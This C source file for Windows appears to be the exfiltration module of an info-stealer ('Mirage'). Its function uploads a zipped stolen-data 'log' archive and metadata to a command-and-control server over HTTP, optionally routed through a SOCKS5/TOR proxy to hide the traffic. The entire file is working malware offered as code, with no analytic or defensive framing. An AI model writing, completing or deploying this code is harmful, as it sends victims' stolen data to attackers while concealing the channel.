#include "panel_http.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#ifdef ENABLE_SOCKS5
#include "socks5.h"
#include "config.h"
#endif

#pragma comment(lib, "ws2_32.lib")

static int net_send_all(SOCKET sock, const void *data, size_t len) {
    const char *ptr = (const char *)data;
    while (len > 0) {
        int n = send(sock, ptr, (int)len, 0);
        if (n <= 0) return -1;
        ptr += n;
        len -= (size_t)n;
    }
    return 0;
}

int upload_log(const char *c2_host, unsigned short c2_port,
               const char *token, const unsigned char *archive_data,
               size_t archive_len, const char *metadata) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;

    SOCKET sock = INVALID_SOCKET;
#ifdef ENABLE_SOCKS5
    /* Route C2 traffic through the SOCKS5 proxy (TOR, etc.). */
    if (socks5_connect(SOCKS5_HOST, SOCKS5_PORT, c2_host, c2_port, &sock) != 0) {
        sock = INVALID_SOCKET;
    }
#endif

    if (sock == INVALID_SOCKET) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) { WSACleanup(); return -1; }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(c2_port);
        addr.sin_addr.s_addr = inet_addr(c2_host);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            closesocket(sock);
            WSACleanup();
            return -1;
        }
    }

    /* Build multipart request */
    const char *boundary = "----MirageBoundary";
    char header[2048];
    int header_len = snprintf(header, sizeof(header),
        "POST /api/log HTTP/1.1\r\n"
        "Host: %s\r\n"
        "X-API-Key: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        c2_host, token, boundary, archive_len + strlen(metadata) + 100, boundary);

    if (header_len <= 0 || (size_t)header_len >= sizeof(header)) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    /* Send header + archive + metadata + footer */
    int ok = 0;
    ok |= net_send_all(sock, header, (size_t)header_len);
    ok |= net_send_all(sock, archive_data, archive_len);

    char footer[256];
    int footer_len = snprintf(footer, sizeof(footer),
        "\r\n--%s\r\n"
        "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n",
        boundary, metadata, boundary);
    if (footer_len > 0 && (size_t)footer_len < sizeof(footer))
        ok |= net_send_all(sock, footer, (size_t)footer_len);

    if (ok != 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    /* Read response (loop until close or buffer full) */
    char resp[4096];
    int total = 0;
    int n;
    while (total < (int)sizeof(resp) - 1) {
        n = recv(sock, resp + total, (int)sizeof(resp) - 1 - total, 0);
        if (n <= 0) break;
        total += n;
    }
    resp[total] = '\0';

    closesocket(sock);
    WSACleanup();

    /* Check for HTTP 200 */
    if (total >= 12 && resp[9] == '2' && resp[10] == '0' && resp[11] == '0') {
        return 0;
    }
    return -1;
}
